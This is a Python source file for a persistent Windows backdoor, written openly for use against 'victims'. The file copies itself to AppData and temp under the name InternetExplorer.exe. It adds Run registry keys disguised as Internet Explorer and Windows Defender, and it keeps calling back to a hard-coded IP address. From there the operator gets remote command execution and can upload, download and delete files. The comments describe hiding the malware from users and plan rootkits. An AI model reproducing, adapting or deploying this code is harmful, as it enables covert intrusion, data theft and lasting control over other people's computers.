#!/usr/bin/env python

# this backdoor is cpoied into two different locsation
# one location is temo file location and ohter is environ location of app data
# nad then two registries are made

# ****************exculsively made for windows ***********************************

# this is hazadorous file ...please be sure you know what this file does before you palce to victim
# *******************saftey at your own risk


#  this is persistent backdorr than overrides the registry files ....please make sure you know what are these registry files
# and also make sure that you can delete them later

#  ************************ V SAI MAHIDHAR *****************************************


#  *******************THIS PROGRAMM FOES THE FOLLOWING *************************
#*************************************************************************************
#**************************************************************************************
"""

Exclusively for the windows

THis is version 1.0.0
Dated 13 November 2018................@IITH at 23:30 PM

Persistance --itself hides in two different locations APP data roaming and APP data local -temp file
#app data is hiden folder so most computers victims cannot see APp data untill unless they click view and select veiw hideen files
we stored in two locations as temp files can be deleted by using %tyemp% or temp in win+R run command
#is thats why APp Data roaming also used to hide the file

Secondly we have edited the registry files such that there will be no doubt even if they look at them
To see the registry people need to have enouigh knowldge but hey dont
we have put two registry entires so that even if one failes the other will work


Back door features

upload , download files , remove files , cd command and rest all commands as usual
Even if hacker is not online , this code will alwasy try to connect me to hacker every 10 seconds

Problems::::::::
when i use reconnect , it is not working and CPU resources are increasing very rapidly ....
now the problem to address is how to connect to hacker even if he cuts of the connection .........we want to connect him back
#hoping that next time he will be online


########ISSSUE SOLVED
now even if hacker cloeses the connection , i have created a seperate seession for backdoor by running it again using subprocess on the
file at APP data roaming and this creates new session killing the existing ones
#now this newly executed file will try to connect to hacker
#as a result from system start up onwards the file will continously run untill hacker connects


##small issue is as i used two registry entries , it is opening and running two ifles as a result nunmber of files increasing in task manager
##however it is not consuming that much resources...little safe
##solution here is to use only one registry entry so that only one file will be executled and seen
##later versions could be by using

#########ROOTKITS TO HIDE FROM FROM KERNEL ################################
New version updated to
1.0.4 ---where new feature is program always run in the background untill hacker connects

Old version 1.0.0 ---failekd verisons 1.0.1,1.0.2,1.0.3 --cpu consumptions high and failed results

NEW Relase date 14 november 2018, 00:06 AM


"""
import socket, subprocess, json, time, os, base64, shutil, sys, tempfile,threading


class Backdoor____():
    def __init__(self, ip, port):
        self.ip = ip
        self.port = port
        self.__persistance__()
        self.connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.exit_command = ["exit", "quell", "ruin", "0", 'close', 'end']

    def __persistance__(self):
        # evil_file_location = tempfile.gettempdir()
        # or use

        evil_file_location = os.environ["appdata"] + "\\InternetExplorer.exe"
        evil_file_location2 = tempfile.gettempdir() + "\\InternetExplorer.exe"

        if not os.path.exists(evil_file_location) or not os.path.exists(evil_file_location2):
            shutil.copy(sys.executable, evil_file_location)
            shutil.copy(sys.executable, evil_file_location2)

            subprocess.call('reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v InternetExplorer /t REG_SZ /d "' + evil_file_location + '"',shell=True)
            subprocess.call('reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v WindowsDefender /t REG_SZ /d "' + evil_file_location2 + '"',shell=True)
            #subprocess.call(
            #        'reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v avast /t REG_SZ /d "' + evil_file_location2 + '"',
            #        shell=True, stderr=__DEV__NULL__, stdin=__DEV__NULL__)

    def _execute_system_commands_(self, rcv_data):
        __DEV__NULL__ = open(os.devnull, 'wb')
        return subprocess.check_output(rcv_data, shell=True, stderr=__DEV__NULL__, stdin=__DEV__NULL__)

    def __reliable_send__(self, command):
        try:
            cmd_data = self._execute_system_commands_(command)
            json_data = json.dumps(cmd_data)
            self.connection.send(json_data)
        except:
            self.connection.send(json.dumps("[-]Command not found\n"))

    def __reliable_recieve(self):
        json_data = ""
        while True:
            try:
                json_data = json_data + self.connection.recv(1024)
                return json.loads(json_data)
            except ValueError:
                continue

    def __from_current_dir_to__(self, path):
        try:
            os.chdir(path)
            return "[+] Changing directory to " + path
        except:
            return "[-] No such directory or file exits for given " + path

    def __file__download__(self, path):
        try:
            with open(path, "rb") as f:
                return base64.b64encode(f.read())
        except:
            return "[-] file deosnt exit on the disk"

    def __upload__file__(self, path, data):

        with open(path, "wb") as f:
            f.write(base64.b64decode(data))
        return "[+]Upload successfull...."

    def __remove__file__(self, path):
        try:
            os.remove(path)
            return "[+] file has been removed successfully"
        except:
            return "[-] file not found to be deleted "

    def data_handling(self):
        while True:
            command = self.__reliable_recieve()
            # command = self.connection.recv(1024)  # set the buffer size..this is size of each batch of data that is i can receive max x bytes at a tim
            # print(command)
            if command[0] in self.exit_command:
                print("closing connection................")
                evil_file_location = os.environ["appdata"] + "\\InternetExplorer.exe"
                subprocess.call(evil_file_location,shell=True)
                self.connection.close()
                sys.exit()
                break

            elif command[0] == "Force":  # victim entered control C and it sends FOrce option
                while True:

                    try:

                        self.connection.connect((self.ip, self.port))

                        break
                    except socket.error:
                        self.connection.close()
                        print("Socket closed")
                        time.sleep(2)
                        continue

            elif command[0] == "cd" and len(command) > 1:
                path = self.__from_current_dir_to__(command[1])
                self.connection.send(json.dumps(path))

            elif command[0] == "download":
                __file__contents__ = self.__file__download__(command[1])
                self.connection.send(json.dumps(__file__contents__))

            elif command[0] == "upload":

                result = self.__upload__file__(command[1], command[2])
                # print(result)
                self.connection.send(json.dumps(result))

            elif command[0] == "remove":
                result = self.__remove__file__(command[1])
                self.connection.send(json.dumps(result))


            else:
                self.__reliable_send__(command)



    def run(self):
        while True:
            try:
                self.connection.connect((self.ip, self.port))
                break
            except Exception:
                continue
        self.data_handling()




backdoor = Backdoor____("192.168.105.245", 8080)
backdoor.run()